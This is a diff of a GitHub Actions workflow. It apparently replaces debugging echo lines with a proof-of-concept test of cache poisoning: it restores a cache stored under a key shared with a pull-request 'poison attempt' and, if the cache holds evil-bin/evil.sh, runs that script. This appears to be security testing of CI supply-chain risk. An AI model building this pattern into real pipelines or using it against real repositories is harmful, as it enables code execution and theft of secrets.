@@ -14,18 +14,16 @@ jobs:
       - name: context
         run: |
           echo "REF=${{ github.ref }}"
-          echo "SHA=${{ github.sha }}"
-          echo "REF_NAME=${{ github.ref_name }}"
-          echo "EVENT_NAME=${{ github.event_name }}"
-          echo "UPSTREAM_HEAD_BRANCH=${{ github.event.workflow_run.head_branch }}"
-          echo "UPSTREAM_HEAD_SHA=${{ github.event.workflow_run.head_sha }}"
-          echo "UPSTREAM_EVENT=${{ github.event.workflow_run.event }}"
-          echo "UPSTREAM_NAME=${{ github.event.workflow_run.name }}"
+          echo "CACHE_TOKEN_MODE probe below"
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - name: Cache goreleaser (same key as PR poison attempt)
+        id: cache-goreleaser
+        uses: actions/cache@v3
         with:
-          fetch-depth: 0
-      - name: what was checked out
+          path: evil-bin
+          key: POC-CACHE-KEY
+      - name: Would execute cached binary
         run: |
-          git log -1 --format='%H %s'
-          echo "--- marker (main has MAIN, PR had ATTACKER) ---"
-          cat marker.txt || echo "no marker on main"
+          echo "cache-hit=${{ steps.cache-goreleaser.outputs.cache-hit }}"
+          ls -la evil-bin || true
+          if [ -f evil-bin/evil.sh ]; then echo "=== RESTORED, EXECUTING ==="; bash evil-bin/evil.sh; else echo "NOT_RESTORED"; fi
